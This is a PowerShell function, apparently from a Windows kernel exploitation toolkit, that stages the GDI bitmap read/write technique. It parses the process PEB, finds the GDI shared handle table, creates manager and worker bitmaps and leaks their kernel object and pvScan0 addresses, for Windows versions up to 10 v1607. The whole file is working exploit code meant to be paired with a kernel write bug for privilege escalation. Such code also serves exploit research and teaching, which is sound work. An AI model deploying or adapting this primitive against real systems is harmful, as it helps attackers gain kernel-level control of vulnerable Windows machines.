function Stage-BitmapReadWrite {
<#
.SYNOPSIS
    Get PowerShell PEB, create manager&worker bitmaps and leak kernel objects.

    Warning: This only works up to Windows 10 v1607!

.DESCRIPTION
    Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.EXAMPLE
    C:\PS> Stage-BitmapReadWrite

    ManagerpvScan0       : -7692227456944
    WorkerHandleTable    : 767454567328
    ManagerKernelObj     : -7692227457024
    PEB                  : 8757247991808
    WorkerpvScan0        : -7692227415984
    ManagerHandle        : -737866269
    WorkerHandle         : 2080706172
    GdiSharedHandleTable : 767454478336
    ManagerHandleTable   : 767454563656
    WorkerKernelObj      : -7692227416064
    
    C:\PS> $BitMapObject = Stage-BitmapReadWrite
    C:\PS> "{0:X}" -f $BitMapObject.ManagerKernelObj
    FFFFF9010320F000
#>

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct _PROCESS_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;
		public IntPtr PebBaseAddress;
		public IntPtr AffinityMask;
		public IntPtr BasePriority;
		public UIntPtr UniqueProcessId;
		public IntPtr InheritedFromUniqueProcessId;
	}

	[StructLayout(LayoutKind.Explicit, Size = 256)]
	public struct _PEB
	{
		[FieldOffset(148)]
		public IntPtr GdiSharedHandleTable32;
		[FieldOffset(248)]
		public IntPtr GdiSharedHandleTable64;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct _GDI_CELL
	{
		public IntPtr pKernelAddress;
		public UInt16 wProcessId;
		public UInt16 wCount;
		public UInt16 wUpper;
		public UInt16 wType;
		public IntPtr pUserAddress;
	}

	public static class Gdi32
	{
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateBitmap(
			int nWidth,
			int nHeight,
			uint cPlanes,
			uint cBitsPerPel,
			IntPtr lpvBits);
	}

	public static class Ntdll
	{
		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
			IntPtr processHandle, 
			int processInformationClass,
			ref _PROCESS_BASIC_INFORMATION processInformation,
			int processInformationLength,
			ref int returnLength);
	}
"@

	# Flag architecture $x32Architecture/!$x32Architecture
	if ([System.IntPtr]::Size -eq 4) {
		$x32Architecture = 1
	}

	# Current Proc handle
	$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle

	# Process Basic Information
	$PROCESS_BASIC_INFORMATION = New-Object _PROCESS_BASIC_INFORMATION
	$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
	$returnLength = New-Object Int
	$CallResult = [Ntdll]::NtQueryInformationProcess($ProcHandle, 0, [ref]$PROCESS_BASIC_INFORMATION, $PROCESS_BASIC_INFORMATION_Size, [ref]$returnLength)

	# Lazy PEB parsing
	$_PEB = New-Object _PEB
	$_PEB = $_PEB.GetType()
	$BufferOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()
	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
	$PEBFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB)

	# _GDI_CELL size
	$_GDI_CELL = New-Object _GDI_CELL
	$_GDI_CELL_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($_GDI_CELL)

	# Manager Bitmap
	[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
	$ManagerBitmap = [Gdi32]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
	if ($x32Architecture) {
		$ManagerHandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)
		$ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($ManagerHandleTableEntry)) + 0x30
	} else {
		$ManagerHandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($ManagerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$ManagerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)
		$ManagerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($ManagerHandleTableEntry)) + 0x50
	}

	# Worker Bitmap
	[IntPtr]$Buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(0x64*0x64*4)
	$WorkerBitmap = [Gdi32]::CreateBitmap(0x64, 0x64, 1, 32, $Buffer)
	if ($x32Architecture) {
		$WorkerHandleTableEntry = $PEBFlags.GdiSharedHandleTable32.ToInt32() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)
		$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt32($WorkerHandleTableEntry)) + 0x30
	} else {
		$WorkerHandleTableEntry = $PEBFlags.GdiSharedHandleTable64.ToInt64() + ($($WorkerBitmap -band 0xffff)*$_GDI_CELL_Size)
		$WorkerKernelObj = [System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)
		$WorkerpvScan0 = $([System.Runtime.InteropServices.Marshal]::ReadInt64($WorkerHandleTableEntry)) + 0x50
	}

	$BitMapObject = @()
	$HashTable = @{
		PEB = if ($x32Architecture){$PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt32()}else{$PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64()}
		GdiSharedHandleTable = if ($x32Architecture){$PEBFlags.GdiSharedHandleTable32.ToInt32()}else{$PEBFlags.GdiSharedHandleTable64.ToInt64()}
		ManagerHandle = $ManagerBitmap
		ManagerHandleTable = $ManagerHandleTableEntry
		ManagerKernelObj = $ManagerKernelObj
		ManagerpvScan0 = $ManagerpvScan0
		WorkerHandle = $WorkerBitmap
		WorkerHandleTable = $WorkerHandleTableEntry
		WorkerKernelObj = $WorkerKernelObj
		WorkerpvScan0 = $WorkerpvScan0
	}
	$Object = New-Object PSObject -Property $HashTable
	$BitMapObject += $Object
	$BitMapObject
}